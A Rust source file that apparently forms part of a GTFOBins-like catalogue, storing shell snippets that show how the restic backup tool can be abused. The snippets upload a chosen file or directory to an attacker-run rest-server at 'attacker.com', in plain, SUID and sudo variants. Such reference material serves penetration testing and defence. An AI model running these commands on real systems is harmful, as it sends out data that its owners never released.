pub static BIN_NAME: &'static str = "restic";
pub static BIN_DESC_1: &'static str = "The attacker must setup a server to receive the backups, in the following example `rest-server` is used but there are other options. To start a new instance and create a new repository:";
pub static BIN_CODE_1: &'static str = r#"
    
    RPORT=12345
    NAME=backup_name
    ./rest-server --listen ":$RPORT"
    restic init -r "rest:http://localhost:$RPORT/$NAME"
"#;
pub static BIN_DESC_2: &'static str =
    "To extract the data from the restic repository in the current directory on the attacker side:";
pub static BIN_CODE_2: &'static str = r#"
    
    restic restore -r "/tmp/restic/$NAME" latest --target .
"#;
pub static FU_DESC: &'static str =
    "Upload data to the attacker server with the following commands.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_or_dir_to_get
    NAME=backup_name
    restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which restic) .

    RHOST=attacker.com
    RPORT=12345
    LFILE=file_or_dir_to_get
    NAME=backup_name
    ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_or_dir_to_get
    NAME=backup_name
    sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
